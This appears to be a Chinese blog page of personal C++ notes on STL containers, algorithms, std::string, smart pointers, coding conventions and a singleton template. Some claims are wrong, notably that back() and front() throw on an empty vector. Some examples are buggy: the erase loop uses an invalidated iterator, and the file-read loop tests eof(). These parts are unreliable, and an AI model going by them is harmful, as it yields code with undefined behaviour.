适配器，必须结合其他的容器使用，stl中默认的内部容器是deque。先进后出，只有一个出口，不允许遍历。</p></li><li><p>queue 是受限制的deque，内部容器一般使用list较简单。先进先出，不允许遍历。</p></li></ol><p><strong>下面是选择顺序容器类型的一些准则</strong></p><ol><li><p>如果我们需要随机访问一个容器则vector要比list好得多。</p></li><li><p>如果我们已知要存储元素的个数则vector 又是一个比list好的选择。</p></li><li><p>如果我们需要的不只是在容器两端插入和删除元素则list显然要比vector好</p></li><li><p>除非我们需要在容器首部插入和删除元素否则vector要比deque好。</p></li><li><p>如果只在容易的首部和尾部插入数据元素，则选择deque。</p></li><li><p>如果只需要在读取输入时在容器的中间位置插入元素，然后需要随机访问元素，则可考虑输入时将元素读入到一个List容器，接着对此容器重新拍学，使其适合顺序访问，然后将排序后的list容器复制到一个vector容器中</p></li></ol><h3 id="向量-std-vector"><a href="#向量-std-vector" class="headerlink" title="向量 std::vector"></a>向量 std::vector</h3><h4 id="操作接口"><a href="#操作接口" class="headerlink" title="操作接口"></a>操作接口</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Type&gt; vType;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 传回最后一个数据，不检查这个数据是否存在，不存在会抛出异常。</span></span><br><span class="line"><span class="comment"> * @return 返回值描述 (const vType &amp;)(vType &amp;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.back();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 传回第一个数据，不检查这个数据是否存在，不存在会抛出异常。</span></span><br><span class="line"><span class="comment"> * @return 返回值描述 (const vType &amp;)(vType &amp;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.front();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 判断容器是否为空。</span></span><br><span class="line"><span class="comment"> * @return 返回值描述 bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.empty();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 删除最后一个数据，空向量不会报错。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.pop_back();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 移除容器中所有数据。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description C++11前使用的插入函数</span></span><br><span class="line"><span class="comment"> * @param (const Type &amp;)要插入的数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.push_back(Type(param));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description C++11使用的插入函数</span></span><br><span class="line"><span class="comment"> * @param (const Type &amp;)要插入的数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.emplace_back(Type(param));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 返回第i个数据，相当于vType[i]</span></span><br><span class="line"><span class="comment"> * @param (size_type)数据索引</span></span><br><span class="line"><span class="comment"> * @return 返回值描述 (const vType &amp;)(vType &amp;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.at(i);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 返回指向数组第一个元素的指针，空向量返回NULL</span></span><br><span class="line"><span class="comment"> * @return 返回值描述 (const vType *)(vType *)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.data();</span><br></pre></td></tr></table></figure><h3 id="std-map"><a href="#std-map" class="headerlink" title="std::map"></a>std::map</h3><h4 id="查找元素"><a href="#查找元素" class="headerlink" title="查找元素"></a>查找元素</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">map</span>&lt;QString, <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Session&gt;&gt; sessionMap;</span><br><span class="line">sessionMap[<span class="string">"Hello"</span>] = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">if</span> (sessionMap.count(<span class="string">"Hello"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    LOG_ERROR(<span class="string">"Key \"Hello\" isn't in map"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sessionMap[<span class="string">"Hello"</span>];</span><br></pre></td></tr></table></figure><h3 id="std-stack"><a href="#std-stack" class="headerlink" title="std::stack"></a>std::stack</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; myStack;     <span class="comment">//定义类型为int</span></span><br><span class="line">    myStack.push(<span class="number">10</span>);       <span class="comment">//入栈</span></span><br><span class="line">    myStack.push(<span class="number">50</span>);       <span class="comment">//入栈</span></span><br><span class="line">    <span class="keyword">int</span> a = myStack.top();  <span class="comment">//返回栈顶元素的引用，不会出栈</span></span><br><span class="line">    myStack.pop();          <span class="comment">//出栈，void型</span></span><br><span class="line">    <span class="keyword">bool</span> isEmpty = myStack.empty();         <span class="comment">//是否为空</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">size</span> = myStack.<span class="built_in">size</span>();    <span class="comment">//栈的元素数量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="std-queue"><a href="#std-queue" class="headerlink" title="std::queue"></a>std::queue</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; myQueue;         <span class="comment">//定义类型为int</span></span><br><span class="line">    myQueue.push(<span class="number">10</span>);           <span class="comment">//入队</span></span><br><span class="line">    myQueue.push(<span class="number">50</span>);           <span class="comment">//入队</span></span><br><span class="line">    <span class="keyword">int</span> a = myQueue.front();    <span class="comment">//返回队列最先进入的元素的引用，不会出队</span></span><br><span class="line">    <span class="keyword">int</span> b = myQueue.back();     <span class="comment">//返回队列最后进入的元素的引用，不会出队</span></span><br><span class="line">    myQueue.pop();              <span class="comment">//删除最先进入队列的元素，void型</span></span><br><span class="line">    <span class="keyword">bool</span> isEmpty = myQueue.empty();         <span class="comment">//队列是否为空</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">size</span> = myQueue.<span class="built_in">size</span>();    <span class="comment">//队列的元素数量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>push()，实际上是调用的底层容器的push_back()函数，新元素的值是push函数参数的一个拷贝。</li><li>emplace()，实际上是调用的底层容器的emplace_back()函数，新元素的值是在容器内部就地构造的，不需要移动或者拷贝。</li></ul><h3 id="通用工具方法"><a href="#通用工具方法" class="headerlink" title="通用工具方法"></a>通用工具方法</h3><h4 id="max-最大值"><a href="#max-最大值" class="headerlink" title="max()最大值"></a>max()最大值</h4><h4 id="min-最小值"><a href="#min-最小值" class="headerlink" title="min()最小值"></a>min()最小值</h4><h4 id="swap-交换两个值"><a href="#swap-交换两个值" class="headerlink" title="swap()交换两个值"></a>swap()交换两个值</h4><h4 id="erase-擦除"><a href="#erase-擦除" class="headerlink" title="erase()擦除"></a>erase()擦除</h4><p>使用遍历的时候，如果去除一个对象，遍历的变量会直接指向下一个，需要注意</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Type&gt; vType;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = vType.cbegin(); it != vType.cend();) &#123;</span><br><span class="line">    <span class="keyword">if</span>(...) &#123;</span><br><span class="line">        <span class="comment">//擦除后会直接指向下一块地址，不需要++</span></span><br><span class="line">        vType.erase(it);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    it++</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二分查找-lower-bound-upper-bound-binary-search"><a href="#二分查找-lower-bound-upper-bound-binary-search" class="headerlink" title="二分查找 lower_bound/upper_bound/binary_search"></a>二分查找 lower_bound/upper_bound/binary_search</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; listNum;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; num;</span><br><span class="line">        listNum.emplace_back(num);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> l, r, q;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; l &gt;&gt; r &gt;&gt; q;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从左边查找大于等于l的第一个迭代器</span></span><br><span class="line">        <span class="keyword">auto</span> ln = lower_bound(listNum.<span class="built_in">begin</span>(), listNum.<span class="built_in">end</span>(), l);</span><br><span class="line">        <span class="comment">//从右边查找大于r的第一个迭代器</span></span><br><span class="line">        <span class="keyword">auto</span> rn = upper_bound(listNum.<span class="built_in">begin</span>(), listNum.<span class="built_in">end</span>(), r);</span><br><span class="line">        <span class="comment">//是否存在q</span></span><br><span class="line">        <span class="keyword">bool</span> isExist = binary_search(listNum.<span class="built_in">begin</span>(), listNum.<span class="built_in">end</span>(), q);</span><br><span class="line">        <span class="comment">//可以得出存在于[l, r]区间的个数</span></span><br><span class="line">        <span class="keyword">int</span> count = rn - ln;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="稳定分区-stable-partition"><a href="#稳定分区-stable-partition" class="headerlink" title="稳定分区 stable_partition"></a>稳定分区 stable_partition</h4><p>将符合表达式的元素前移，不符合表达式的后移，保持原本的相对位置不变</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reOrderArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;<span class="built_in">array</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 奇数放前面，偶数放后面，两边分别的相对位置保持不变</span></span><br><span class="line">    stable_partition(<span class="built_in">array</span>.<span class="built_in">begin</span>(), <span class="built_in">array</span>.<span class="built_in">end</span>(),</span><br><span class="line">                     [](<span class="keyword">const</span> <span class="keyword">int</span> &amp;value) &#123; <span class="keyword">return</span> (value % <span class="number">2</span> == <span class="number">1</span>); &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="std标准库"><a href="#std标准库" class="headerlink" title="std标准库"></a>std标准库</h2><h3 id="字符串-std-string"><a href="#字符串-std-string" class="headerlink" title="字符串 std::string"></a>字符串 std::string</h3><h4 id="data-和c-str-区别"><a href="#data-和c-str-区别" class="headerlink" title="data()和c_str()区别"></a>data()和c_str()区别</h4><p>data()效率较c_str()高一些，但是c_str()更加标准，结尾会加入’\0’。</p><h4 id="find-last-of"><a href="#find-last-of" class="headerlink" title="find_last_of()"></a>find_last_of()</h4><p>可以从后往前找匹配的字符，并且，这个字符可以以字串的形式给出，也就是只要匹配参数中字串的任意字符就返回其位置。第二参数可选，为起始位置，默认为npos。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str = <span class="string">"012345678"</span>;</span><br><span class="line"><span class="keyword">int</span> index = str.find_last_of(<span class="string">"3"</span>);  <span class="comment">//3</span></span><br><span class="line">index = str.find_last_of(<span class="string">"8"</span>);      <span class="comment">//8</span></span><br><span class="line">index = str.find_last_of(<span class="string">"8"</span>, <span class="number">7</span>);   <span class="comment">//-1</span></span><br><span class="line">index = str.find_last_of(<span class="string">"8"</span>, <span class="number">8</span>);   <span class="comment">//8</span></span><br><span class="line">index = str.find_last_of(<span class="string">"0"</span>);      <span class="comment">//0</span></span><br><span class="line">index = str.find_last_of(<span class="string">"9"</span>);      <span class="comment">//-1</span></span><br><span class="line">index = str.find_last_of(<span class="string">"24"</span>);     <span class="comment">//4</span></span><br></pre></td></tr></table></figure><h4 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h4><p>两个参数，第一个为起始位置，第二个为size。</p><h3 id="函数包装器模板-std-function"><a href="#函数包装器模板-std-function" class="headerlink" title="函数包装器模板 std::function"></a>函数包装器模板 std::function</h3><p><a href="https://www.cnblogs.com/heartchord/p/5017071.html" target="_blank" rel="noopener">std::function介绍</a></p><h3 id="原子操作-std-atomic"><a href="#原子操作-std-atomic" class="headerlink" title="原子操作 std::atomic"></a>原子操作 std::atomic</h3><p><a href="https://www.cnblogs.com/taiyang-li/p/5914331.html" target="_blank" rel="noopener">std::atomic原子操作</a></p><h3 id="对象转移所有权-std-move"><a href="#对象转移所有权-std-move" class="headerlink" title="对象转移所有权 std::move"></a>对象转移所有权 std::move</h3><p><a href="https://www.cnblogs.com/SZxiaochun/p/8017349.html" target="_blank" rel="noopener">std::move介绍</a></p><h2 id="流处理"><a href="#流处理" class="headerlink" title="流处理"></a>流处理</h2><h3 id="文件流"><a href="#文件流" class="headerlink" title="文件流"></a>文件流</h3><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>按行读取</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> InputFileName <span class="meta-string">"input.txt"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//打开文件</span></span><br><span class="line">    <span class="function">ifstream <span class="title">inFile</span><span class="params">(InputFileName)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断是否打开了文件</span></span><br><span class="line">    <span class="keyword">if</span> (!inFile) &#123;</span><br><span class="line">        LOG_ERROR(<span class="string">"Failed to open file %s"</span>, InputFileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//按行读取文件</span></span><br><span class="line">    <span class="keyword">while</span> (!inFile.eof()) &#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        inFile.getline(buf, <span class="number">100</span>);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; buf &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><h3 id="模板类"><a href="#模板类" class="headerlink" title="模板类"></a>模板类</h3><h4 id="静态成员函数"><a href="#静态成员函数" class="headerlink" title="静态成员函数"></a>静态成员函数</h4><ul><li>C++模板类中的静态成员函数需要在头文件里定义，否则会出现LNK2019，找不到所定义的函数。也就是说对于静态函数，C++的编译器默认是不会查找相应的源文件的。</li></ul><h2 id="C-11新特性"><a href="#C-11新特性" class="headerlink" title="C++11新特性"></a>C++11新特性</h2><h3 id="智能指针"><a href="#智能指针" class="headerlink" title="智能指针"></a>智能指针</h3><h4 id="weak-ptr弱指针"><a href="#weak-ptr弱指针" class="headerlink" title="weak_ptr弱指针"></a>weak_ptr弱指针</h4><p>弱指针判断指向的对象是否存在只能通过<code>lock()</code>方法，如果不为空则返回强引用指针，否则返回<code>nullptr</code></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">std</span>::weak_ptr&lt;type&gt; tmp = a;</span><br><span class="line"><span class="keyword">if</span> (tmp.lock() == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">//指向地址不存在</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//指向地址存在</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="工程建议"><a href="#工程建议" class="headerlink" title="工程建议"></a>工程建议</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><ul><li>所有代码文件最好使用utf-8编码，比较统一</li><li>需要使用中文打印的可能会要求GB2312等，单独列出一个头文件使用宏定义，单独使用相应的编码</li></ul><h2 id="公用常量、类型和方法"><a href="#公用常量、类型和方法" class="headerlink" title="公用常量、类型和方法"></a>公用常量、类型和方法</h2><ul><li>找一个单独的文件constant.hpp进行存放</li><li>定义较多分模块添加constant目录</li><li>使用<code>const + 类型</code>进行定义防止类型模糊使用</li><li>使用inline函数定义函数，防止类型混用</li></ul><h2 id="函数内部局部变量使用"><a href="#函数内部局部变量使用" class="headerlink" title="函数内部局部变量使用"></a>函数内部局部变量使用</h2><ul><li>C11以上的标准可以在代码中间定义变量</li><li>需要用的地方进行定义，不放在函数头部定义，防止定义变量用不着导致内存浪费</li></ul><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="文件头部描述"><a href="#文件头部描述" class="headerlink" title="文件头部描述"></a>文件头部描述</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Copyright 公司名称</span></span><br><span class="line"><span class="comment"> * @Author 作者</span></span><br><span class="line"><span class="comment"> * @Date 创建时间</span></span><br><span class="line"><span class="comment"> * @Description 文件描述</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h3 id="方法和函数在头文件写注释"><a href="#方法和函数在头文件写注释" class="headerlink" title="方法和函数在头文件写注释"></a>方法和函数在头文件写注释</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 函数描述</span></span><br><span class="line"><span class="comment"> * @参数名称 参数描述</span></span><br><span class="line"><span class="comment">   ......</span></span><br><span class="line"><span class="comment"> * @return 返回值描述</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h3 id="类内部属性在后面写注释"><a href="#类内部属性在后面写注释" class="headerlink" title="类内部属性在后面写注释"></a>类内部属性在后面写注释</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">type param = initValue; <span class="comment">//param描述</span></span><br></pre></td></tr></table></figure><h3 id="前缀"><a href="#前缀" class="headerlink" title="前缀"></a>前缀</h3><ul><li>类中的属性使用<code>m_</code></li><li>全局变量使用<code>g_</code></li><li>静态变量使用<code>s_</code></li><li>常量使用<code>c_</code></li><li>指针使用<code>p</code>开头</li><li>变量首字母小写，驼峰命名</li><li>函数动作名称开头，首字母小写，驼峰命名</li></ul><h2 id="参数判断"><a href="#参数判断" class="headerlink" title="参数判断"></a>参数判断</h2><ul><li>参数属于程序员错误，使用断言让错误发生前移</li><li>错误码功能单一，成功即成功，失败中不可有成功情况</li></ul><h1 id="错误总结"><a href="#错误总结" class="headerlink" title="错误总结"></a>错误总结</h1><h2 id="头文件不要using-namespace"><a href="#头文件不要using-namespace" class="headerlink" title="头文件不要using namespace"></a>头文件不要using namespace</h2><p>头文件使用<code>using namespace</code>会污染所有包含此头文件的文件</p><h2 id="参数传递看情况使用引用"><a href="#参数传递看情况使用引用" class="headerlink" title="参数传递看情况使用引用"></a>参数传递看情况使用引用</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">type <span class="title">function</span><span class="params">(<span class="keyword">const</span> type &amp;arg)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>引用的形式可以减少复制的过程</li><li>我自己的想法是对于超过int大小的变量使用引用的形式来传参。</li><li>对于部分对外的参数可以不使用引用比如</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="function"><span class="built_in">string</span> <span class="title">toJson</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><h2 id="const的使用"><a href="#const的使用" class="headerlink" title="const的使用"></a>const的使用</h2><h3 id="外部不可更改"><a href="#外部不可更改" class="headerlink" title="外部不可更改"></a>外部不可更改</h3><p>对于引用传递的参数，为防止外部修改，加const修饰。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> type &amp;<span class="title">getArg</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><h3 id="内部不可更改"><a href="#内部不可更改" class="headerlink" title="内部不可更改"></a>内部不可更改</h3><p>对于get方法等内部参数不会被修改的方法，在后部加const修饰</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="function"><span class="built_in">string</span> <span class="title">toJson</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br></pre></td></tr></table></figure><h2 id="参数赋值必须用自己的类型"><a href="#参数赋值必须用自己的类型" class="headerlink" title="参数赋值必须用自己的类型"></a>参数赋值必须用自己的类型</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//错误方式</span></span><br><span class="line"><span class="keyword">bool</span> arg = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//正确方式</span></span><br><span class="line"><span class="keyword">bool</span> arg = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h2 id="类的建立需要添加构造函数和删除构造函数"><a href="#类的建立需要添加构造函数和删除构造函数" class="headerlink" title="类的建立需要添加构造函数和删除构造函数"></a>类的建立需要添加构造函数和删除构造函数</h2><p>拷贝构造函数，允许被拷贝才需要添加</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">temp</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">//允许拷贝</span></span><br><span class="line">        temp(<span class="keyword">const</span> temp &amp;a) = <span class="keyword">default</span>;</span><br><span class="line">        <span class="comment">//不允许拷贝</span></span><br><span class="line">        temp(<span class="keyword">const</span> temp &amp;a) = <span class="keyword">delete</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="类的内部属性需要初始化"><a href="#类的内部属性需要初始化" class="headerlink" title="类的内部属性需要初始化"></a>类的内部属性需要初始化</h2><p>在参数声明的地方初始化，参数列表是给自己写的构造函数用的，并根据需要删除或声明为私有默认构造函数。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//hpp</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">temp</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        temp(<span class="keyword">const</span> type1 &amp;a);</span><br><span class="line">        <span class="comment">//如果需要</span></span><br><span class="line">        temp() = <span class="keyword">delete</span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="comment">//或者</span></span><br><span class="line">        temp();</span><br><span class="line"></span><br><span class="line">        type1 m_arg1 = type1InitValue;</span><br><span class="line">        type2 m_arg2 = type2InitValue;</span><br><span class="line">        type3 m_arg3 = type3InitValue;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cpp</span></span><br><span class="line">temp::temp(<span class="keyword">const</span> type1 &amp;a) : m_arg1(a);</span><br></pre></td></tr></table></figure><h2 id="单例构建"><a href="#单例构建" class="headerlink" title="单例构建"></a>单例构建</h2><p>base/BaseInstance.hpp 为一个模板类，用来给需要写为单例的类使用</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> BaseInstance_hpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BaseInstance_hpp</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> cb &#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BaseNoCopy</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        BaseNoCopy()&#123; &#125;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        BaseNoCopy(<span class="keyword">const</span> BaseNoCopy &amp;obj);</span><br><span class="line">        BaseNoCopy(BaseNoCopy *pObj);</span><br><span class="line">        BaseNoCopy(<span class="keyword">const</span> BaseNoCopy *pObj);</span><br><span class="line">        BaseNoCopy&amp; <span class="keyword">operator</span> = (<span class="keyword">const</span> BaseNoCopy &amp;obj);</span><br><span class="line">        BaseNoCopy&amp; <span class="keyword">operator</span> = (<span class="keyword">const</span> BaseNoCopy *pObj);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">class</span> <span class="title">BaseInstance</span>:</span> <span class="keyword">public</span> BaseNoCopy &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">static</span> T &amp;<span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">static</span> T s_instance;</span><br><span class="line">            CreateObject.do_nothing();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> s_instance;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">protected</span>:</span><br><span class="line">        BaseInstance()&#123; &#125;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        BaseInstance(<span class="keyword">const</span> BaseInstance &amp;obj);</span><br><span class="line">        BaseInstance <span class="keyword">operator</span> = (<span class="keyword">const</span> BaseInstance &amp;obj);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ObjectCreator</span> &#123;</span></span><br><span class="line">            ObjectCreator() &#123;</span><br><span class="line">                BaseInstance&lt;T&gt;::getInstance();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">do_nothing</span><span class="params">()</span><span class="keyword">const</span></span>&#123; &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">static</span> ObjectCreator CreateObject;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">    <span class="keyword">typename</span> BaseInstance&lt;T&gt;::ObjectCreator BaseInstance&lt;T&gt;::CreateObject;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* BaseInstance_hpp */</span></span></span><br></pre></td></tr></table></figure><p>使用方法</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">temp</span> :</span> <span class="keyword">public</span> BaseInstance&lt;temp&gt;</span><br><span class="line">&#123;</span><br><span class="line">    